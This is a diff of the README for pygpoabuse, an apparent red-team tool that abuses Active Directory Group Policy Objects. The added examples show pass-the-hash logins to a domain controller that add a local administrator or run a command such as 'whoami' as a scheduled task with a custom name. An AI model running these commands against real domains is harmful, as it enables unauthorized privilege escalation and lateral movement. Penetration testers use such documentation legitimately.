@@ -15,9 +15,24 @@ Default behavior adds a local administrator.
 ### Basic usage
 
 Add **john** user to local administrators group (Password: **H4x00r123..**)
-
 ```bash
-./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
+python3.8 pygpoabuse.py domain.com/username@pdc.domain.com -gpo-id "17DF9AB4-2AAF-4E60-BF0C-75746436C80F" -f -vv -hashes 8BFD10F0484F52314831296E66EF7C51:8BFD10F0484F52314831296E66EF7C51 -dc_ip_or_fqdn pdc.domain.com
+``` 
+
++Call **whoami**... but you won't see it anyway )
+```bash
+python3.8 pygpoabuse.py domain.com/username@pdc.domain.com -gpo-id "17DF9AB4-2AAF-4E60-BF0C-75746436C80F" -f -vv -hashes 8BFD10F0484F52314831296E66EF7C51:8BFD10F0484F52314831296E66EF7C51 -dc_ip_or_fqdn pdc.domain.com -command 'whoami'
+``` 
+
++Give custom task name 
+```bash
+python3.8 pygpoabuse.py domain.com/username@pdc.domain.com -gpo-id "17DF9AB4-2AAF-4E60-BF0C-75746436C80F" -f -vv -hashes 8BFD10F0484F52314831296E66EF7C51:8BFD10F0484F52314831296E66EF7C51 -dc_ip_or_fqdn pdc.domain.com -command 'whoami' -taskname RastaDoNotTouch
+``` 
+
++Using password instead of hash. Well you will be prompted for it
+```bash
+python3.8 pygpoabuse.py domain.com/username@pdc.domain.com -gpo-id "17DF9AB4-2AAF-4E60-BF0C-75746436C80F" -f -vv -dc_ip_or_fqdn pdc.domain.com -command 'whoami' -taskname RastaDoNotTouch
+Password: *****************
 ``` 
 
 ### Advanced usage
